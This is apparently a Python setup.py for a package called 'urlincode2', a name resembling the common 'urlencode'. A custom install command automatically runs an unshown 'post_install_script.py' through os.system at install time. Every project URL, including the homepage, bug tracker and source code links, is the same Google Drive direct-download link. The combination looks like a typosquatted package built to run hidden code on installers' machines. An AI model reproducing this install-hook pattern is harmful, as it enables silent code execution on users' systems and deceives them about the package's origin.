from setuptools import setup, find_packages
from setuptools.command.install import install
import os

class PostInstallCommand(install):
    def run(self):
        # Run the standard install process
        install.run(self)

        # Run your post-install script here
        os.system("python post_install_script.py")
setup(
    name='urlincode2',
    version='0.5.1',
    packages=find_packages(),
    url='https://drive.google.com/uc?export=download&id=1CLSXbDL-xTmlRikbT2sUXBMWOENRnDRs',
    project_urls= {
    	'Homepage': 'https://drive.google.com/uc?export=download&id=1CLSXbDL-xTmlRikbT2sUXBMWOENRnDRs',
        'Bug Tracker': 'https://drive.google.com/uc?export=download&id=1CLSXbDL-xTmlRikbT2sUXBMWOENRnDRs',
        'Source Code': 'https://drive.google.com/uc?export=download&id=1CLSXbDL-xTmlRikbT2sUXBMWOENRnDRs'
    },
    cmdclass = {
    'install': PostInstallCommand,
}
)

